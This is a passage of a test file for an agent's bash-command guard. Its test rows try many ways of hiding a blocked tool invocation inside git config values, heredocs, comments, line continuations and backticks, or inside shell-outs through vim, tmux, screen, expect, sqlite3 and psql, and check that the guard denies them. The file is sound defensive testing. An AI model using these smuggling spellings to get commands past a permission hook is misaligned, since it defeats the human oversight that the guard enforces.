    const result = decide(bashCall('git -c core.pager="X=ruflo $PAGER" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
  })

  it('control (round-3, unchanged): core.pager="X=node_modules/.bin/ruflo $PAGER" log still denies via unresolved-command', () => {
    const result = decide(bashCall('git -c core.pager="X=node_modules/.bin/ruflo $PAGER" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })
})

// SMI-6869 governance round-10 C1/C2: two mechanisms in
// `hasUnresolvableValueHead`. C1: a multi-command value's head test now
// covers every command segment (`valueSegments`, split on the tokenizer's
// `op` tokens), not just the first word, so an unresolvable segment can no
// longer hide a resolvable one behind it. C2: a value carrying a literal
// `$(...)`/backtick substitution (`carriesResolvableSubstitution`) is never
// skipped, since its body is text this guard can read.
describe("decide() — SMI-6869 governance round 10 C1/C2: a config value is shell TEXT — every command segment's head is tested, and a substitution is read, not skipped", () => {
  // Rows 1-8 deny via `unresolved-command`: the first evaluated segment's
  // head is unresolvable, and that arm runs before the recursion reaches
  // the ruflo segment. Rows 9-10 reach the ruflo text first and deny H4.
  it.each([
    [
      '1: unresolvable head, ; , then ruflo',
      `git -c core.pager="$X; ${R}" log`,
      'unresolved-command:',
    ],
    [
      '2: unresolvable head, &&, then ruflo',
      `git -c core.pager="$X && ${R}" log`,
      'unresolved-command:',
    ],
    [
      '3: unresolvable head, ||, then ruflo',
      `git -c core.pager="$X || ${R}" log`,
      'unresolved-command:',
    ],
    [
      '4: unresolvable head, |, then ruflo',
      `git -c core.pager="$X | ${R}" log`,
      'unresolved-command:',
    ],
    [
      '5: unresolvable head, real newline, then ruflo',
      `git -c core.pager="$X\n${R}" log`,
      'unresolved-command:',
    ],
    [
      '6: unresolvable $(...) head, ; , then ruflo',
      `git -c core.pager="$(id); ${R}" log`,
      'unresolved-command:',
    ],
    [
      '7: alias bang, unresolvable head, ; , then ruflo',
      `git config alias.x '!$X; ${R}'`,
      'unresolved-command:',
    ],
    [
      '8: git-crypt smudge filter, unresolvable head, ; , then ruflo',
      `git config --local filter.git-crypt.smudge "$SMUDGE_CMD; ${R}"`,
      'unresolved-command:',
    ],
    [
      "9 (C2): core.pager='$(ruflo memory store)' log — base emitted H4, PR #2963 wrongly allowed, this restores H4",
      `git -c core.pager='$(${R})' log`,
      'H4:',
    ],
    [
      "10: assignment-shaped segment 1 (X=$Y), then ; , then ruflo — the flatten's other direction",
      `git -c core.pager="X=$Y; ${R}" log`,
      'H4:',
    ],
  ])('%s denies', (_label, cmd, labelPrefix) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(labelPrefix)
  })

  // Controls: a value shaped the SAME way as the deny rows above (an
  // unresolvable first segment) but whose OTHER segment names nothing
  // ruflo-shaped. These three allow on both the merged and the fixed
  // tree, because EVERY segment in them is unresolvable (so the value is
  // skipped outright, same as the pre-existing M1 single-segment case) --
  // they are not multi-segment-with-one-resolvable-segment shapes.
  it.each([
    ['ctrl: unresolvable ; unresolvable (both $)', 'git -c core.pager="$X; $Y" log'],
    ['ctrl: alias bang, unresolvable ; unresolvable (both $)', "git config alias.x '!$X; $Y'"],
    [
      'ctrl: git-crypt smudge filter, single unresolvable segment (pre-existing M1 shape, unaffected)',
      'git config --local filter.git-crypt.smudge "$SMUDGE_CMD"',
    ],
  ])('%s allows', (_label, cmd) => {
    expect(decide(bashCall(cmd), {}).action).toBe('allow')
  })

  it.each([
    ['git config value: unresolvable && ordinary word', 'git -c core.pager="$X && less" log'],
    [
      'git config value: unresolvable $(...) ; ordinary word',
      'git -c core.pager="$(id); less" log',
    ],
    ['top-level control: same shape, no git config at all', "bash -c '$X && less'"],
  ])(
    "%s: a value the guard reads is shell text and gets shell text's posture: an unresolvable head in an evaluated segment denies unresolved-command, as the same text under bash -c does",
    (_label, cmd) => {
      const result = decide(bashCall(cmd), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain('unresolved-command:')
    }
  )

  it('a backtick-substitution config value denies via H4 — the tokenizer reads the backtick body through the $(...) normalization', () => {
    const result = decide(bashCall(`git -c core.pager='\`${R}\`' log`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

// SMI-6869 governance round 11, F2 (High): `{`/`}`/`(`/`)` are GROUPING
// tokens, not command separators, but `valueSegments` used to split on
// EVERY op token — so `${VAR}` arrived as the four tokens `$`, op `{`,
// `VAR`, op `}`, and the brace boundary put the bare `VAR` word in its own
// segment where it read as a RESOLVABLE head. That made `${PAGER}`
// extract-and-deny while the bare `$PAGER` spelling skipped: two spellings
// of one construct, two verdicts. Fixed by splitting segments only on the
// real command separators (`; && || | & <newline>`).
describe('decide() — SMI-6869 governance round 11 F2: `{`/`}`/`(`/`)` are grouping, not segment boundaries — a braced/parenthesized $VAR reference is unresolvable exactly like its bare spelling', () => {
  it.each([
    ['bare ${PAGER}', 'git -c core.pager="${PAGER}" log'],
    ['bare ${SMUDGE_CMD}', 'git config --local filter.git-crypt.smudge "${SMUDGE_CMD}"'],
    ['bare ${CLEAN_CMD}', 'git config --local filter.git-crypt.clean "${CLEAN_CMD}"'],
    ['${PAGER:-less} default-value form', 'git -c core.pager="${PAGER:-less}" log'],
    ['${PAGER} -R (braced head, ordinary tail)', 'git -c core.pager="${PAGER} -R" log'],
    ['alias bang value !${X}', "git config alias.x '!${X}'"],
  ])('%s -> allow', (_label, cmd) => {
    expect(decide(bashCall(cmd), {}).action).toBe('allow')
  })

  // Controls: `{`/`(` grouping around an unresolvable head still denies
  // once the guard's recursion reaches the ruflo text inside — measured to
  // deny on both the merged and the fixed tree, so these are NOT evidence
  // the fix changed anything; they confirm the boundary-op narrowing didn't
  // regress the case a brace/paren wraps a genuinely resolvable invocation.
  it.each([
    ['{ $X; }; ruflo memory store', `git -c core.pager="{ $X; }; ${R}" log`],
    ['($X); ruflo memory store', `git -c core.pager="($X); ${R}" log`],
  ])('control: %s -> deny (unaffected by the boundary-op fix)', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })
})

// SMI-6869 governance round 11, F3 (High): the skip's premise is "the guard
// can neither resolve the head NOR read the name" — but the second half of
// that premise quantifies over the WHOLE segment, not just its head. With
// `$X` unset, `sh -c '$X ruflo memory store'` runs `ruflo memory store`, so
// a readable name behind an unresolvable head is text this guard CAN read,
// whether it sits in a later SEGMENT (already fixed) or in an ARGUMENT slot
// of the SAME segment, or in a heredoc/here-string body the unresolvable
// head may go on to execute. Twelve rows below are the shapes governance
// round 11 measured allowing on the merged tree despite a readable name
// this guard could read.
describe('decide() — SMI-6869 governance round 11 F3: the skip cannot hide a readable name behind an unresolvable head — an argument-slot name or a heredoc/here-string body is text this guard can read', () => {
  it.each([
    ['1 base: $X ruflo memory store', `git -c core.pager="$X ${R}" log`],
    ['2 alias-of-1', `git config alias.x '!$X ${R}'`],
    ['3 smudge-of-1', `git config --local filter.git-crypt.smudge "$X ${R}"`],
    ['4 $X npx ruflo memory store', `git -c core.pager="$X npx ${R}" log`],
    ['5 $X; $Y ruflo memory store', `git -c core.pager="$X; $Y ${R}" log`],
    ['6 heredoc base ($SHELL <<EOF)', `git -c core.pager="$SHELL <<EOF\n${R}\nEOF" log`],
    ['7 heredoc $X variant', `git -c core.pager="$X <<EOF\n${R}\nEOF" log`],
    ['8 heredoc <<- variant', `git -c core.pager="$SHELL <<-EOF\n${R}\nEOF" log`],
    [
      "9 heredoc <<'EOF' quoted-delimiter variant",
      `git -c core.pager="$SHELL <<'EOF'\n${R}\nEOF" log`,
    ],
    ['10 heredoc alias spelling', `git config alias.x '!$SHELL <<EOF\n${R}\nEOF'`],
    [
      '11 heredoc smudge spelling',
      `git config --local filter.git-crypt.smudge "$SHELL <<EOF\n${R}\nEOF"`,
    ],
    ["12 here-string: $X <<< 'ruflo memory store'", `git -c core.pager="$X <<< '${R}'" log`],
  ])('%s -> deny', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })

  // Controls: same unresolvable-head-plus-tail-text shape, but the tail
  // never spells the name (a redirect TARGET or an unrelated file
  // argument) — these allow on both trees.
  it.each([
    [
      'git-crypt smudge with an extra resolvable-looking arg, no name',
      'git config --local filter.git-crypt.smudge "$SMUDGE_CMD $EXTRA_ARG"',
    ],
    ['$X < ruflo (file redirect target, not exec)', 'git -c core.pager="$X < ruflo" log'],
    ['$X > ruflo (file redirect target, not exec)', 'git -c core.pager="$X > ruflo" log'],
    [
      '$PAGER ruflo.md (file argument, not the tool name)',
      'git -c core.pager="$PAGER ruflo.md" log',
    ],
  ])('control: %s -> allow', (_label, cmd) => {
    expect(decide(bashCall(cmd), {}).action).toBe('allow')
  })
})

// SMI-6869 governance round 12 (cross-family gate, class 2): the tokenizer
// had no comment rule at all, so `git -c core.pager="$X # ruflo" log`
// denied unresolved-command -- round 11's every-word name test read
// "ruflo" sitting right there after the `#`, even though a real shell
// never executes commented-out text. Fixed in the tokenizer itself: an
// unquoted `#` starting a NEW word discards through the next newline.
describe('decide() — SMI-6869 governance round 12 F4: an unquoted # at a word boundary starts a comment, so a name after it is never read', () => {
  it.each([
    'git -c core.pager="$X # ruflo" log',
    'git -c core.pager="$X #ruflo" log',
    'echo hi # ruflo memory store',
  ])('%s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  it('control: ruflo memory store # hi -> deny H4 (the name comes before the comment)', () => {
    const result = decide(bashCall('ruflo memory store # hi'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it.each(["echo 'a # ruflo'", 'echo a#ruflo'])(
    'control: %s -> allow (quoted, or no word boundary before #)',
    (command) => {
      expect(decide(bashCall(command), {}).action).toBe('allow')
    }
  )
})

// SMI-6869 governance round 15 (C1 regression, this PR's own comment rule):
// the round-12 F4 fix used `cur === null` alone as the comment boundary,
// which is the TOKENIZER's word boundary, not bash's -- `{`/`}` flush as op
// tokens unconditionally, and the whitespace flush used JS `/\s/`, which
// treats CR/VT/FF/NBSP as blanks though bash's own word-ending blanks are
// only space/tab/newline. Either gap let a "comment" swallow a real ruflo
// invocation after it. Fixed with a positive allowlist
// (`COMMENT_BOUNDARY_CHARS`) shared with env-read-guard.mjs's own tokenizer.
describe('decide() — SMI-6869 governance round 15 C1: a # glued to }/{ or to a non-bash blank is not a comment boundary, so H5 still fires on the invocation after it', () => {
  it.each([
    ['glued to } (${X}#x)', 'echo ${X}#x; npx ruflo memory store'],
    ['glued to a non-bash blank (NBSP)', 'echo hi\u00a0#x; npx ruflo memory store'],
  ])(
    '%s -> deny H5 (the # never starts a comment, so the invocation is not hidden)',
    (_label, command) => {
      const result = decide(bashCall(command), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain('H5:')
    }
  )

  it('echo hi # x; npx ruflo memory store -> allow (control: a REAL comment, preceded by an actual space, still hides the invocation)', () => {
    expect(decide(bashCall('echo hi # x; npx ruflo memory store'), {}).action).toBe('allow')
  })

  it('echo a\\#b; npx ruflo memory store -> deny H5 (control: an escaped # never starts a comment, boundary or not)', () => {
    const result = decide(bashCall('echo a\\#b; npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it.each([
    ['parameter-length operator (${#arr[@]})', 'echo ${#arr[@]}; npx ruflo memory store'],
    ['parameter-pattern operator (${v#pat})', 'echo ${v#pat}; npx ruflo memory store'],
    ['a URL fragment (http://x/#f)', 'echo http://x/#f; npx ruflo memory store'],
  ])(
    '%s -> deny H5 (control: unaffected by this fix, a genuine non-comment # the guard already read correctly)',
    (_label, command) => {
      const result = decide(bashCall(command), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain('H5:')
    }
  )
})

// SMI-6892 C3 (round 16): a `)` is a comment boundary only when it closes
// a COMMAND-position `(` (a real subshell/group), or it is UNMATCHED --
// measured in bash 3.2, bash 5.2 and zsh 5.9, all three agreeing. A
// WORD-position `)` is NOT a boundary: zsh's glob-alternation group
// `(a|b)#x` (measured live -- with no match, zsh's own parse error is `no
// matches found: (a|b)#x`, i.e. `#x` was already part of the glob token)
// and bash's array-assignment parens `a=(1 2)#x` (bash runs the tail; zsh
// reads a comment -- the shells disagree, so the word-position reading
// wins, the safer direction for a guard) both keep `#x` live. A
// `\`+newline continuation removed just before the `#` does not change
// either verdict (the continuation rows below).
describe('decide() — SMI-6892 C3: a ) is a comment boundary only when it closes a command-position ( or is unmatched, not unconditionally', () => {
  it('(echo x)#x; npx ruflo memory store -> allow (a command-position close -- a real subshell -- IS a comment boundary)', () => {
    expect(decide(bashCall('(echo x)#x; npx ruflo memory store'), {}).action).toBe('allow')
  })

  it('echo (a|b)#x; npx ruflo memory store -> deny H5 (a WORD-position close -- the zsh glob-alternation shape -- is NOT a boundary, measured live in zsh 5.9)', () => {
    const result = decide(bashCall('echo (a|b)#x; npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it('a=(1 2)#x; npx ruflo memory store -> deny (a WORD-position close -- array assignment -- keeps the tail live in bash; the VAR= prefix then makes the unresolved `1` deny on its own, before the ruflo tail is even reached)', () => {
    const result = decide(bashCall('a=(1 2)#x; npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command')
  })

  it('echo (a|b)\\<nl>#x; npx ruflo memory store -> deny H5 (a removed continuation right before # does not turn a word-position close into a boundary)', () => {
    const result = decide(bashCall('echo (a|b)\\\n#x; npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it('(echo x)\\<nl>#x; npx ruflo memory store -> allow (same continuation removal, but a command-position close -- still a boundary)', () => {
    expect(decide(bashCall('(echo x)\\\n#x; npx ruflo memory store'), {}).action).toBe('allow')
  })

  it('(echo x); npx ruflo memory store -> deny H5 (control: no # at all, unaffected by this rule)', () => {
    const result = decide(bashCall('(echo x); npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it('f()# npx ruflo memory store<nl>{ :; }; f -> allow (SMI-6892 round 17: an EMPTY function-definition ) glued to the name IS a comment boundary)', () => {
    expect(decide(bashCall('f()# npx ruflo memory store\n{ :; }; f'), {}).action).toBe('allow')
  })

  it("case a in (a)# npx ruflo memory store<nl>:;;<nl>esac -> allow (SMI-6892 round 17: a case statement's own leading pattern ( IS a comment boundary too)", () => {
    expect(decide(bashCall('case a in (a)# npx ruflo memory store\n:;;\nesac'), {}).action).toBe(
      'allow'
    )
  })

  it('f ( )#x; npx ruflo memory store<nl>{ :; } -> deny H5 (a SPACED function-paren close -- the zsh glob-word shape -- is NOT a boundary)', () => {
    const result = decide(bashCall('f ( )#x; npx ruflo memory store\n{ :; }'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it('a=()#x; npx ruflo memory store -> deny H5 (an empty array-assignment ) keeps the tail live in bash; the name carries =, so it is not a function definition)', () => {
    const result = decide(bashCall('a=()#x; npx ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it('f() { npx ruflo memory store; } -> deny H5 (control: a real function body, no # at all, unaffected by this rule)', () => {
    const result = decide(bashCall('f() { npx ruflo memory store; }'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })

  it('f (\\<nl>)#x; npx ruflo memory store<nl>{ :; } -> deny H5 (SMI-6892 round 18: a continuation INSIDE the function parens makes zsh read ()#x as a glob word and run the tail; bash reads a comment; the tail stays live)', () => {
    const result = decide(bashCall('f (\\\n)#x; npx ruflo memory store\n{ :; }'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5:')
  })
})

// SMI-6892 C2 (round 16, pre-existing, both guards): a backslash + newline
// is a LINE CONTINUATION bash and zsh both remove before word splitting,
// but the tokenizer's backslash branch appended the newline into the word
// instead -- `npx ru<nl>flo memory store` reached the ruflo predicates as
// the literal string `"ru\nflo"`, which is not `ruflo`, and allowed. Each
// row below must give the EXACT SAME verdict and reason as its
// non-continuation spelling.
describe('decide() — SMI-6892 C2: a line continuation (backslash + newline) is invisible to the guard, exactly like its non-continuation spelling', () => {
  it.each([
    ['npx ru\\<nl>flo memory store (command NAME split)', 'npx ru\\\nflo memory store'],
    ['npx \\<nl>ruflo memory store (before the name)', 'npx \\\nruflo memory store'],
  ] as const)('%s matches its plain spelling', (_label, contCmd) => {
    const contResult = decide(bashCall(contCmd), {})
    const plainResult = decide(bashCall('npx ruflo memory store'), {})
    expect(contResult.action).toBe(plainResult.action)
    expect(contResult.action).toBe('deny')
    expect(reasonOf(contResult)).toBe(reasonOf(plainResult))
  })
})

describe('decide() — SMI-6869: a backtick substitution is read like a $(...) substitution: one construct, one representation', () => {
  it('double-quoted git config value denies — measured red/green against the reverted tokenizer: this is the row the fix actually changes', () => {
    const result = decide(bashCall('git -c core.pager="`which ruflo`" log'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })

  // Controls: measured to already deny with the tokenizer reverted (a
  // different pre-existing mechanism reaches these two independently of
  // the $(...) normalization) — kept here to confirm the fix doesn't
  // regress them, not as evidence the fix changed anything for them.
  it.each([
    ['single-quoted git config value', "git -c core.pager='`which ruflo`' log"],
    ['alias bang value', "git config alias.x '!`which ruflo`'"],
  ])('%s still denies', (_label, cmd) => {
    const result = decide(bashCall(cmd), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command:')
  })

  it.each([
    ['top-level, unrelated command wrapping the name', '`which less`', '$(which less)', 'deny'],
    ['top-level, ordinary substitution', 'echo `date`', 'echo $(date)', 'allow'],
    [
      'assignment value, then a benign command',
      'X=`ruflo memory store` less',
      'X=$(ruflo memory store) less',
      'deny',
    ],
    [
      'git config value, double-quoted, unrelated command wrapping the name',
      'git -c core.pager="`which ruflo`" log',
      'git -c core.pager="$(which ruflo)" log',
      'deny',
    ],
    [
      'git config value, single-quoted, whole value is the tool',
      "git -c core.pager='`ruflo memory store`' log",
      "git -c core.pager='$(ruflo memory store)' log",
      'deny',
    ],
    [
      'bash -c, double-quoted, whole body is the tool',
      'bash -c "`ruflo memory store`"',
      'bash -c "$(ruflo memory store)"',
      'deny',
    ],
  ] as const)(
    '%s: the backtick and $(...) spellings reach the same verdict and label',
    (_label, backtickCmd, dollarCmd, expectedAction) => {
      const backtickResult = decide(bashCall(backtickCmd), {})
      const dollarResult = decide(bashCall(dollarCmd), {})
      const labelOf = (r: ReturnType<typeof decide>) =>
        reasonOf(r).match(/\[ruflo-host-guard\]\s*([^:]+):/)?.[1] ?? ''
      expect(backtickResult.action).toBe(expectedAction)
      expect(backtickResult.action).toBe(dollarResult.action)
      expect(labelOf(backtickResult)).toBe(labelOf(dollarResult))
    }
  )

  it.each([
    ['top-level, benign substitution as an echo argument', 'echo `date`'],
    ['top-level, benign substitution as an ls argument', 'ls `pwd`'],
  ])('%s allows', (_label, cmd) => {
    expect(decide(bashCall(cmd), {}).action).toBe('allow')
  })
})

describe('decide() — SMI-6869 consumer-string: vim/nvim ex-commands', () => {
  it('vim -c with a bang (":!cmd") ex-command denies via H4', () => {
    const result = decide(bashCall(`vim -Nu NONE -c ':!${R}' -c q`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('vim leading-+ positional bang ex-command denies via H4', () => {
    const result = decide(bashCall(`vim '+!${R}' file`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('nvim --cmd bang denies via H4', () => {
    const result = decide(bashCall(`nvim --cmd '!${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('vim -c "call system(...)" denies via H8-script — Vimscript SOURCE, caught by the shared quoted-text regex, no Vimscript-specific parsing', () => {
    const result = decide(bashCall(`vim -c 'call system("${R}")'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('vim -c "terminal cmd" denies via H4', () => {
    const result = decide(bashCall(`vim -c 'terminal ${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: vim -c "set number" (ordinary Vimscript, no shell/system/terminal shape) allows', () => {
    expect(decide(bashCall("vim -c 'set number' file.txt"), {}).action).toBe('allow')
  })

  it('C1: vimdiff -c bang denies via H4 — vimdiff (and view/ex/gvimdiff/nvimdiff/evim/eview/rvim/rview/rgvim/rgview) is the SAME binary under a personality argv[0], missing from the original VIM_BASENAMES set', () => {
    const result = decide(bashCall(`vimdiff -c '!${R}' a b`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — SMI-6869 consumer-string: tmux send-keys/new-window', () => {
  it('tmux send-keys with a trailing Enter denies via H4', () => {
    const result = decide(bashCall(`tmux send-keys '${R}' Enter`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('tmux new-window denies via H4', () => {
    const result = decide(bashCall(`tmux new-window '${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('tmux run-shell denies via H4', () => {
    const result = decide(bashCall(`tmux run-shell '${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: tmux ls allows', () => {
    expect(decide(bashCall('tmux ls'), {}).action).toBe('allow')
  })

  it('C2: tmux new-session -d denies via H4 — new-session/new, respawn-pane, if-shell, pipe-pane and display-popup were all missing from the shell-subcommand set', () => {
    const result = decide(bashCall(`tmux new-session -d '${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('M1: tmux send-keys -t 0 (a numeric pane target) with an ordinary command allows — the flag VALUE is no longer kept as command text, so it never trips the all-digit arm', () => {
    expect(decide(bashCall("tmux send-keys -t 0 'ls -la' Enter"), {}).action).toBe('allow')
  })

  it('M1: tmux new-window -t 0 (numeric) with an ordinary command allows', () => {
    expect(decide(bashCall("tmux new-window -t 0 'htop'"), {}).action).toBe('allow')
  })

  it('control: tmux new-window -t 9 with a ruflo command still denies via H4 — the value-flag fix only drops the FLAG value, not the real positional', () => {
    const result = decide(bashCall(`tmux new-window -t 9 '${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — SMI-6869 consumer-string: screen -X stuff', () => {
  it('screen -X stuff denies via H4', () => {
    const result = decide(bashCall(`screen -X stuff '${R}\\n'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: screen followed by a bare positional command already denies via the PRE-EXISTING H4b bare-name inversion — measured, no new logic needed for this shape', () => {
    const result = decide(bashCall(`screen ${R}`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b')
  })

  it('control: screen -ls allows', () => {
    expect(decide(bashCall('screen -ls'), {}).action).toBe('allow')
  })

  it('C3: screen -X -S sess stuff denies via H4 — real screen accepts its own options BETWEEN -X and the command word, and the original cut required stuff immediately after -X', () => {
    const result = decide(bashCall(`screen -X -S sess stuff '${R}\\n'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — SMI-6869 consumer-string: expect -c spawn/exec', () => {
  it("expect -c 'spawn ...' denies via H4 — the spawned command is extracted as real shell text and recursed", () => {
    const result = decide(bashCall(`expect -c 'spawn ${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: expect -c with no spawn/exec builtin allows', () => {
    expect(decide(bashCall('expect -c \'send "hello"\''), {}).action).toBe('allow')
  })

  it('C5: expect -c \'open "|cmd" r\' denies via H8-script — the whole -c body is ALSO Tcl SOURCE, given the same quoted-text-regex treatment as node/python source, not just a bare spawn/exec prefix', () => {
    const result = decide(bashCall(`expect -c 'open "|${R}" r'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })
})

describe('decide() — SMI-6869 consumer-string: sqlite3 dot-commands (round-4 cross-family gate)', () => {
  it("sqlite3 /tmp/x.db '.shell ...' denies via H4 — the remainder after .shell is extracted as real shell text and recursed", () => {
    const result = decide(bashCall(`sqlite3 /tmp/x.db '.shell ${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("sqlite3 /tmp/x.db '.system ...' denies via H4 — .system is the same shell-out dot-command as .shell", () => {
    const result = decide(bashCall(`sqlite3 /tmp/x.db '.system ${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("sqlite3 -cmd '.system ...' x.db denies via H4 — -cmd's value is sqlite3 command text, same as a trailing positional", () => {
    const result = decide(bashCall(`sqlite3 -cmd '.system ${R}' x.db`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("sqlite3 x.db '.once |...' denies via H4 — .once's leading pipe hands the remainder to a shell, same as .output's", () => {
    const result = decide(bashCall(`sqlite3 x.db '.once |${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("sqlite3 x.db '.output |...' denies via H4", () => {
    const result = decide(bashCall(`sqlite3 x.db '.output |${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("control: sqlite3 /tmp/x.db 'select 1;' allows — ordinary SQL is not extracted", () => {
    expect(decide(bashCall(`sqlite3 /tmp/x.db 'select 1;'`), {}).action).toBe('allow')
  })

  it("control: sqlite3 x.db '.tables' allows — an ordinary dot-command with no shell-out is not extracted", () => {
    expect(decide(bashCall(`sqlite3 x.db '.tables'`), {}).action).toBe('allow')
  })
})

describe('decide() — SMI-6869 consumer-string: psql \\! and COPY/\\copy PROGRAM clauses (round-4 cross-family gate)', () => {
  it("psql -c '\\! ...' denies via H4 — the text after \\! is extracted as real shell text and recursed", () => {
    const result = decide(bashCall(`psql -c '\\! ${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('psql -c "copy t to program \'...\'" denies via H4 — the quoted PROGRAM value survives bash double-quote decoding intact', () => {
    const result = decide(bashCall(`psql -c "copy t to program '${R}'"`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("psql -c '\\copy t to program ''...''' denies via H4 — measured: bash's own doubled-single-quote decoding strips every quote character around the program name before this guard ever sees the argument, so the extractor's unquoted fallback (not the quoted-string branch) is what fires here", () => {
    const result = decide(bashCall(`psql -c '\\copy t to program ''${R}'''`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("psql -f - fed a heredoc with a \\! line denies via H4 — the same READABLE_STDIN_RE + segment-heredoc lookup awk/sed's own -f already uses", () => {
    const command = `psql -f - <<'EOF'\n\\! ${R}\nEOF`
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("control: psql -c 'select 1' allows — ordinary SQL is not extracted", () => {
    expect(decide(bashCall(`psql -c 'select 1'`), {}).action).toBe('allow')
  })

  it("control: psql -c '\\dt' allows — a meta-command that is not \\! and has no PROGRAM clause is not extracted", () => {
    expect(decide(bashCall(`psql -c '\\dt'`), {}).action).toBe('allow')
  })

  it('control: psql -f schema.sql allows — a REAL file path does not match READABLE_STDIN_RE, so the file content is out of reach by design', () => {
    expect(decide(bashCall('psql -f schema.sql'), {}).action).toBe('allow')
  })

  it('control: psql -f - fed a heredoc of ordinary SQL allows — the heredoc body is scanned, but ordinary SQL is not extracted', () => {
    const command = "psql -f - <<'EOF'\nselect 1;\nEOF"
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  it("control: psql -c '\\!ruflo memory store' (glued, no whitespace) denies via H4 — round-6 confirmation-round finding: real psql accepts the glued form identically to the spaced one, and the original \\s+ requirement missed it", () => {
    const result = decide(bashCall(`psql -c '\\!${R}'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('psql -c "COPY t TO PROGRAM E\'...\'" denies via H4 — round-6 Class 1 fix: an E-prefixed string literal is now recognized as a real PostgreSQL string (previously the quoted arm didn\'t recognize the E prefix and the bare-text fallback extracted the literal text "Eruflo memory store", which never spelled a bare ruflo)', () => {
    const result = decide(bashCall(`psql -c "COPY t TO PROGRAM E'${R}'"`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('psql -c "COPY t FROM PROGRAM E\'...\'" denies via H4 — FROM PROGRAM is the same operand shape as TO PROGRAM', () => {
    const result = decide(bashCall(`psql -c "COPY t FROM PROGRAM E'${R}'"`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it("psql -c '\\copy t to program $$...$$' denies via H4 — round-6 Class 1 fix: a dollar-quoted PostgreSQL string literal is now recognized as a real string form for the PROGRAM operand", () => {
    const result = decide(bashCall(`psql -c '\\copy t to program $$${R}$$'`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

